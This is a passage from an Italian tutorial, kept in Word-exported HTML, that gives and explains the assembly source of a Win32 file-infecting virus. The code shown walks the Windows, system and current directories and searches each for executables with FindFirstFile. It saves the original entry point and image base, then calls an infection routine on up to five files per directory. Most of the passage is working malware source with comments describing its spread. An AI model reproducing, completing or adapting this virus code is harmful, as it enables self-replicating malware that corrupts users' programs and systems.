style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>add<span style="mso-spacerun: yes">     </span>edi,7Fh<span
style="mso-spacerun: yes">                         </span>; Punta alla seconda
directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>7Fh<span style="mso-spacerun: yes">                            
</span>; Pusha la misura del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>edi<span style="mso-spacerun: yes">                            
</span>; Pusha indirizzo del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>[ebp+_GetSystemDirectoryA]<span style="mso-spacerun: yes">      </span>;
directory di sistema<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>add<span style="mso-spacerun: yes">     </span>edi,7Fh<span
style="mso-spacerun: yes">                         </span>; Punta alla terza
directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">  </span>edi<span style="mso-spacerun:
yes">                             </span>; Pusha la misura del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>7Fh<span style="mso-spacerun: yes">                            
</span>; Pusha indirizzo del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>[ebp+_GetCurrentDirectoryA]<span style="mso-spacerun: yes">     </span>;
directory corrente<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; VA NELLE TRE
DIRECTORY PRESCELTE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Questa è una
semplice procedura per ottenere le directory dove cercare i files da infettare,
in questo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; particolare
ordine. Dato che la lunghezza massima di una directory è 7F bytes,<span
style="mso-spacerun: yes">  </span>mettiamo nell’heap (vedi <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; sotto) tre
variabili consecutive; in questo modo evitiamo che codice non usato occupi più
bytes, e dati <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; non utilizzati
viaggino con li virus.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------</span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>InfectItAll:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>lea<span style="mso-spacerun: yes">    
</span>edi,[ebp+directories]<span style="mso-spacerun: yes">           </span>;
Puntatore alla 1a directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>byte ptr [ebp+mirrormirror],03h ; 3
directories<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>requiem:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">  </span>edi<span style="mso-spacerun:
yes">                             </span>; Seta directory puntata da EDI<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>[ebp+_SetCurrentDirectoryA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>push<span style="mso-spacerun: yes">    </span>edi<span
style="mso-spacerun: yes">                             </span>; Salva EDI<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>Infect<span style="mso-spacerun: yes">                         
</span>; Infetta I files nella dir.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pop<span style="mso-spacerun:
yes">     </span>edi<span style="mso-spacerun:
yes">                             </span>; Ripristina EDI<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>edi,7Fh<span style="mso-spacerun:
yes">                         </span>; un’altra directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>dec<span style="mso-spacerun:
yes">     </span>byte ptr [ebp+mirrormirror]<span style="mso-spacerun:
yes">     </span>; decrementa il contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jnz<span style="mso-spacerun:
yes">     </span>requiem<span style="mso-spacerun:
yes">                         </span>; è l’ultima ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; DIRECTORY
PRESCELTA COME DIR.CORRENTE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; facciamo in modo
che EDI punti alla prima dir nell’array, dopodiché settiamo il numero delle <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; directories che
vogliamo infettare (dirs2inf=3). Poi ritorniamo al loop principale, che
consiste nel <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; cambiare la
directory selezionata in directory corrente, infettare i files in tale
directory, e così via.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>Infect: and<span style="mso-spacerun: yes">    
</span>dword ptr [ebp+infections],00000000h ; resetta contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>lea<span style="mso-spacerun: yes">     </span>eax,[ebp+offset
WIN32_FIND_DATA] ; trova WFD<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<span
style="mso-spacerun: yes">                             </span>; la pusha<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>lea<span style="mso-spacerun: yes">     </span>eax,[ebp+offset
EXE_MASK]<span style="mso-spacerun: yes">       </span>; cosa cerchiamo ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">   
</span>eax<span style="mso-spacerun: yes">                             </span>;
lo pusha<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>[ebp+_FindFirstFileA] <span style="mso-spacerun: yes">          </span>;
trova il primo file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>inc<span style="mso-spacerun:
yes">     </span>eax<span style="mso-spacerun:
yes">                             </span>; CMP EAX,0FFFFFFFFh<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>jz<span style="mso-spacerun: yes">     
</span>FailInfect<span style="mso-spacerun: yes">                      </span>;
JZ<span style="mso-spacerun: yes">  </span>FAILINFECT<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>dec<span style="mso-spacerun: yes">     </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+SearchHandle],eax ; Sala l’handle di ricerca<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; TROVA IL PRIMO
FILE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Questa è la
prima parte della routine. La prima linea è per ripulire il contatore
dell’infezione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; ottimizzando il
codice (AND occupa meno spazio di MOV). Quindi cerchiamo i files da infettare.
In <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; DOS avevamo l’
INT 21 e le funzioni 4Eh/4Fh. In Win32 abbiamo due API equivalenti:
FindFirstFile e <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; FindNextFile.
Ora cerchiamo il primo file nella directory. Tutte le funzioni per trovare
files in Win32 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; hanno in comune
una struttura (ricordate il DTA?) chiamata WIN32_FIND_DATA (abbreviata spesso <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; in WFD). La
struttura è illustrata più oltre.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>__1:<span
style="mso-spacerun: yes">    </span>push<span style="mso-spacerun: yes">   
</span>dword ptr [ebp+OldEIP]<span style="mso-spacerun: yes">          </span>;
Sala OldEIP e ModBase,<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>dword ptr [ebp+ModBase]<span style="mso-spacerun: yes">        
</span>; modificati nell’infezione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>Infection<span style="mso-spacerun: yes">           </span><span
style="mso-spacerun: yes">            </span>; Infetta un’altro file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pop<span style="mso-spacerun:
yes">     </span>dword ptr [ebp+ModBase]<span style="mso-spacerun:
yes">         </span>; Ripristina<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>pop<span style="mso-spacerun: yes">     </span>dword
ptr [ebp+OldEIP]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>inc<span style="mso-spacerun: yes">     </span>byte ptr
[ebp+infections]<span style="mso-spacerun: yes">       </span>; incrementa
contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">       </span>cmp<span style="mso-spacerun: yes">    
</span>byte ptr [ebp+infections],05h<span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes"> </span>; non più di 5 files<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>FailInfect<span style="mso-spacerun:
yes">                      </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; 8)<span style="mso-spacerun: yes"> 
</span>SALVA L’EIP E L’IMAGE BASE DELL’HOST-RAM NELLO STACK<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">      </span>VA AD INFETTARE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 16)
RIPRISTINA<span style="mso-spacerun: yes">  </span>IL VECCHIO EIP E LA VECCHIA
IMAGEBASE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Per prima cosa
preserviamo il contenuto di alcune variabili indispensabili quando più tardi
torneremo il <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; controllo
all’host-RAM, che saranno modificate durante l’infezione. Quindi chiamiamo la
routine di <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; infezione, per
